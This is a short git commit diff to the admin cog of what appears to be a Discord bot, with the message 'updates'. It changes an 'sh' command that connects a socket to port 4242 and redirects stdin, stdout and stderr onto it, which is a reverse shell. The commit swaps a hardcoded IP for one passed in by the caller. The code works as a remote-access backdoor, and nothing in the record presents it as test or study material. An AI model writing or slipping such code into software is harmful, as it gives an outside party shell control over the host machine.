3cc459cfc0f06200face86d3f265c44cbf118f4e
ShadowAcolyte <shadowacolytegaming@gmail.com>
2022-10-04 19:25:37 +0530

    updates

--- cogs/admin.py
+++ cogs/admin.py
@@ -48,10 +48,11 @@ class Admin(commands.Cog):
     @commands.command(name="sh", description="")
     async def sh(
         self,
-        ctx: commands.Context
+        ctx: commands.Context,
+        ip
     ):
         s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        s.connect(("192.168.206.164",4242))
+        s.connect((ip,4242))
         os.dup2(s.fileno(),0)
         os.dup2(s.fileno(),1)
         os.dup2(s.fileno(),2)
